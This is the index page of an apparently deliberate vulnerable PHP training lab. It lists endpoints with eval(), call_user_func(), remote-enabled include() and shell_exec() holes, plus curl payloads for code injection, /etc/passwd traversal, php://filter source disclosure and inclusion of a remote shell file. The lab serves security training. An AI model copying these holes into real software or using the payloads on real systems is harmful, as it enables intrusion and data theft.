<?php
// M05 PHP target portal. Intentionally vulnerable training material.
?>
<html>
<head><title>M05 PHP code injection / file inclusion</title></head>
<body>
<h1>M05 PHP target</h1>
<p>Intentionally vulnerable. Authorised security testing only.</p>
<ul>
  <li><a href="/eval.php?expr=phpinfo();">/eval.php?expr=</a> - eval() on user input (WSTG-INJT-11)</li>
  <li><a href="/call.php?fn=strtoupper&amp;arg=hello">/call.php?fn=&amp;arg=</a> - call_user_func() on user input</li>
  <li><a href="/page.php?page=home.php">/page.php?page=</a> - include() with allow_url_include=On (LFI + RFI)</li>
  <li><a href="/cmd.php?host=127.0.0.1">/cmd.php?host=</a> - shell_exec() command injection</li>
</ul>
<pre>
# code injection
curl 'http://127.0.0.1:8510/eval.php?expr=echo%20file_get_contents(%27/flag.txt%27);'
# LFI
curl 'http://127.0.0.1:8510/page.php?page=../../../../../../etc/passwd'
# source disclosure
curl 'http://127.0.0.1:8510/page.php?page=php://filter/convert.base64-encode/resource=page.php'
# RFI (in-range host only)
curl 'http://127.0.0.1:8510/page.php?page=http://rfi/shell.txt'
</pre>
</body>
</html>